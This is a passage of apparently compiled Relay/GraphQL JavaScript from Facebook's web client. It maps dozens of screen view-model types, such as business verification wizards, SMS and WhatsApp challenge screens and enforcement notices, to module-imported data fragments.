            type: "AFXProfilePlusBizAdminOnboardingAcceptAccessScreenViewModel",
            abstractKey: null,
          },
          O = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAFXProfilePlusBizAdminOnboardingReviewAccessScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXProfilePlusBizAdminOnboardingReviewAccessScreenViewModel",
            abstractKey: null,
          },
          P = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXRateLimitExperienceCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXRateLimitExperienceScreenViewModel",
            abstractKey: null,
          },
          Q = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXSelfHarmPromotionCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXSelfHarmPromotionScreenViewModel",
            abstractKey: null,
          },
          R = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXSentryAfterDecisionCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXSentryAfterDecisionScreenViewModel",
            abstractKey: null,
          },
          S = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXSentryRestrictionCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXSentryRestrictionScreenViewModel",
            abstractKey: null,
          },
          T = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXStaticContentCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXStaticContentScreenViewModel",
            abstractKey: null,
          },
          U = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXSuicidalAdmissionHomeCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXSuicidalAdmissionHomeScreenViewModel",
            abstractKey: null,
          },
          V = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXSuicidalPromotionCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXSuicidalPromotionScreenViewModel",
            abstractKey: null,
          },
          W = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "AFXUserWarningCometScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AFXUserWarningScreenViewModel",
            abstractKey: null,
          },
          X = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAdvertiserAuthenticityConfirmPhoneNumberIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AdvertiserAuthenticityConfirmPhoneNumberScreenViewModel",
            abstractKey: null,
          },
          Y = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAdvertiserAuthenticityEmailChallengeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AdvertiserAuthenticityEmailChallengeScreenViewModel",
            abstractKey: null,
          },
          Z = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAdvertiserAuthenticityEnterEmailCodeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AdvertiserAuthenticityEnterEmailCodeScreenViewModel",
            abstractKey: null,
          },
          $ = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAdvertiserAuthenticityEnterPhoneCodeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AdvertiserAuthenticityEnterPhoneCodeScreenViewModel",
            abstractKey: null,
          },
          ba = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAdvertiserAuthenticityPageAdminNameDetailsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AdvertiserAuthenticityPageAdminNameDetailsScreenViewModel",
            abstractKey: null,
          },
          ca = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometAdvertiserAuthenticitySelectDomainScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "AdvertiserAuthenticitySelectDomainScreenViewModel",
            abstractKey: null,
          },
          da = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBAPRequestHandlerEmptyScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BAPWizardRequestHandlerScreenViewModel",
            abstractKey: null,
          },
          ea = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardAdvertiserVerificationEnterCodeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardAdvertiserVerificationEnterCodeIXTScreenViewModel",
            abstractKey: null,
          },
          fa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardAdvertiserVerificationEnterPhoneIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardAdvertiserVerificationEnterPhoneIXTScreenViewModel",
            abstractKey: null,
          },
          ga = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardAdvertiserVerificationPhoneVerificationInformationIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardAdvertiserVerificationPhoneVerificationInformationIXTScreenViewModel",
            abstractKey: null,
          },
          ha = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardAdvertiserVerificationSharingIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardAdvertiserVerificationSharingIXTScreenViewModel",
            abstractKey: null,
          },
          ia = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardBankVerificationEnterAmountScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardBankVerificationEnterAmountIXTScreenViewModel",
            abstractKey: null,
          },
          ja = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardBankVerificationOverviewScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardBankVerificationOverviewIXTScreenViewModel",
            abstractKey: null,
          },
          ka = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardBusinessDetailsPrimaryIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardBusinessDetailsPrimaryIXTScreenViewModel",
            abstractKey: null,
          },
          la = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardConfigSelectionIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardConfigSelectionIXTScreenViewModel",
            abstractKey: null,
          },
          ma = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardConfirmAuthVendorRecordIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardConfirmAuthVendorRecordIXTScreenViewModel",
            abstractKey: null,
          },
          na = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardConfirmBusinessIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardConfirmBusinessIXTScreenViewModel",
            abstractKey: null,
          },
          oa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardConfirmStakeholderIdentityIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBBVWizardConfirmStakeholderIdentityIXTScreenViewModel",
            abstractKey: null,
          },
          pa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardCountrySelectionIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardCountrySelectionIXTScreenViewModel",
            abstractKey: null,
          },
          qa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardCustomerServiceEmailEnterCodeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardCustomerServiceEmailEnterCodeIXTScreenViewModel",
            abstractKey: null,
          },
          ra = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardCustomerServicePhoneEnterCodeScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardCustomerServicePhoneEnterCodeScreenViewModel",
            abstractKey: null,
          },
          sa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardDomainVerificationAdditionalRequirementsIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBBVWizardDomainVerificationAdditionalRequirementsScreenViewModel",
            abstractKey: null,
          },
          ta = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardHowToSelectYourOrganizationIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardHowToSelectYourOrganizationScreenViewModel",
            abstractKey: null,
          },
          ua = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardHowWeUseYourInfoIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardHowWeUseYourInfoScreenViewModel",
            abstractKey: null,
          },
          va = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardIDVNameInputIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardIDVNameInputIXTScreenViewModel",
            abstractKey: null,
          },
          wa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardIDVSelectIDTypeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardIDVSelectIDTypeIXTScreenViewModel",
            abstractKey: null,
          },
          xa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardIDVUploadIDIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardIDVUploadIDIXTScreenViewModel",
            abstractKey: null,
          },
          ya = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardManualFlowOverviewIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardManualFlowOverviewIXTScreenViewModel",
            abstractKey: null,
          },
          za = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardOutroIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardOutroIXTScreenViewModel",
            abstractKey: null,
          },
          Aa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardOverviewIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardOverviewIXTScreenViewModel",
            abstractKey: null,
          },
          Ba = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardPreemptiveNMIIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardPreemptiveNMIIXTScreenViewModel",
            abstractKey: null,
          },
          Ca = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardPublicRecordNotFoundIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "XFBBVWizardPublicRecordNotFoundIXTScreenViewModel",
            abstractKey: null,
          },
          Da = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardSelectAuthVendorRecordIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSelectAuthVendorRecordIXTScreenViewModel",
            abstractKey: null,
          },
          Ea = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardSelectBusinessIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSelectBusinessIXTScreenViewModel",
            abstractKey: null,
          },
          Fa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardSellerSelectSupportPhoneNumberChallengeMethodIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSelectSupportPhoneNumberChallengeMethodScreenViewModel",
            abstractKey: null,
          },
          Ga = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardSellerCertificationIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSellerCertificationIXTScreenViewModel",
            abstractKey: null,
          },
          Ha = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardSellerCollectCustomerSupportPhoneNumberIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSellerCollectCustomerSupportPhoneNumberIXTScreenViewModel",
            abstractKey: null,
          },
          Ia = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardSellerCompletionIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSellerCompletionIXTScreenViewModel",
            abstractKey: null,
          },
          Ja = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardSellerPublicAddressIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSellerPublicAddressIXTScreenViewModel",
            abstractKey: null,
          },
          Ka = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardSellerSupportEmailCollectionIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardSellerSupportEmailCollectionIXTScreenViewModel",
            abstractKey: null,
          },
          La = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardTaxIdIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardTaxIdIXTScreenViewModel",
            abstractKey: null,
          },
          Ma = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardVerificationFailedErrorIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardVerificationFailedErrorIXTScreenViewModel",
            abstractKey: null,
          },
          Na = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometBVWizardVerifyYourBankIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardVerifyYourBankIXTScreenViewModel",
            abstractKey: null,
          },
          Oa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometBVWizardWhyIsWebsiteRecommendedIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "BVWizardWhyIsWebsiteRecommendedIXTScreenViewModel",
            abstractKey: null,
          },
          Pa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometCPOWizardIntroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "CPOWizardIntroScreenViewModel",
            abstractKey: null,
          },
          Qa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometCPOWizardOrganizationTypeSelectionScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "CPOWizardOrganizationTypeSelectionScreenViewModel",
            abstractKey: null,
          },
          Ra = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometChallengeSMSConfirmIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ChallengeSMSConfirmIXTScreenViewModel",
            abstractKey: null,
          },
          Sa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometChallengeSMSEnterCodeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ChallengeSMSEnterCodeIXTScreenViewModel",
            abstractKey: null,
          },
          Ta = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometChallengeSelectIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ChallengeSelectIXTScreenViewModel",
            abstractKey: null,
          },
          Ua = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometChallengeWhatsAppConfirmIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ChallengeWhatsAppConfirmIXTScreenViewModel",
            abstractKey: null,
          },
          Va = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometChallengeWhatsAppEnterCodeIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "ChallengeWhatsAppEnterCodeIXTScreenViewModel",
            abstractKey: null,
          },
          Wa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CommunityStandardsScreenComet_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "CommentTombstoneCommunityStandardsScreenViewModel",
            abstractKey: null,
          },
          Xa = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "OurDecisionsScreenComet_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "CommentTombstoneOurDecisionsScreenViewModel",
            abstractKey: null,
          },
          Ya = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementDetailInfoScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementDetailInfoScreenViewModel",
            abstractKey: null,
          },
          Za = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementDetailRequestReviewScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementDetailRequestReviewScreenViewModel",
            abstractKey: null,
          },
          $a = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementDetailViolationListScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementDetailViolationListScreenViewModel",
            abstractKey: null,
          },
          ab = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementNoticeBatchedScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementNoticeBatchedScreenViewModel",
            abstractKey: null,
          },
          bb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementNoticeDetailIPBatchedScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementNoticeDetailIPBatchedScreenViewModel",
            abstractKey: null,
          },
          cb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementNoticeDetailScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementNoticeDetailScreenViewModel",
            abstractKey: null,
          },
          db = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementNoticeScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementNoticeViewModel",
            abstractKey: null,
          },
          eb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometEnforcementNoticeScreenV2_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "EnforcementNoticeScreenV2ViewModel",
            abstractKey: null,
          },
          fb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometFEVWizardConfirmContactInformationScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardConfirmContactInformationScreenViewModel",
            abstractKey: null,
          },
          gb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardDisclaimerOutroScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardDisclaimerOutroScreenViewModel",
            abstractKey: null,
          },
          hb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardDisclaimerTextSelectionScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardDisclaimerTextSelectionScreenViewModel",
            abstractKey: null,
          },
          ib = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardFECConfirmDetailsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardFECConfirmDetailsScreenViewModel",
            abstractKey: null,
          },
          jb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardFECEmailChallengeScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardFECEmailChallengeScreenViewModel",
            abstractKey: null,
          },
          kb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardFECEnterDetailsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardFECEnterDetailsScreenViewModel",
            abstractKey: null,
          },
          lb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardFreeFormMCMCUploadScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardFreeFormMCMCUploadScreenViewModel",
            abstractKey: null,
          },
          mb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardFreeFormOrgDetailsInputScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardFreeFormOrgDetailsInputScreenViewModel",
            abstractKey: null,
          },
          nb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardGovFormScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardGovFormScreenViewModel",
            abstractKey: null,
          },
          ob = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardHowWeUseYourInfoScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardHowWeUseYourInfoScreenViewModel",
            abstractKey: null,
          },
          pb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardMethodSelectionScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardMethodSelectionScreenViewModel",
            abstractKey: null,
          },
          qb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardPageNameEmailChallengeScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardPageNameEmailChallengeScreenViewModel",
            abstractKey: null,
          },
          rb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardPageNameFormScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardPageNameFormScreenViewModel",
            abstractKey: null,
          },
          sb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardReviewAdLibraryListingScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardReviewAdLibraryListingScreenViewModel",
            abstractKey: null,
          },
          tb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometFEVWizardTaxOrgBusinessReviewDetailsScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardTaxOrgBusinessReviewDetailsScreenViewModel",
            abstractKey: null,
          },
          ub = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardTaxOrgBusinessSelectScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardTaxOrgBusinessSelectScreenViewModel",
            abstractKey: null,
          },
          vb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName:
                  "CometFEVWizardTaxOrgDocumentRequirementsIXTScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardTaxOrgDocumentRequirementsScreenViewModel",
            abstractKey: null,
          },
          wb = {
            kind: "InlineFragment",
            selections: [
              {
                args: null,
                documentName: "CIXFacebookScreensRenderer_screen",
                fragmentName: "CometFEVWizardTaxOrgFormScreen_data",
                fragmentPropName: "data",
                kind: "ModuleImport",
              },
            ],
            type: "FEVWizardTaxOrgFormScreenViewModel",
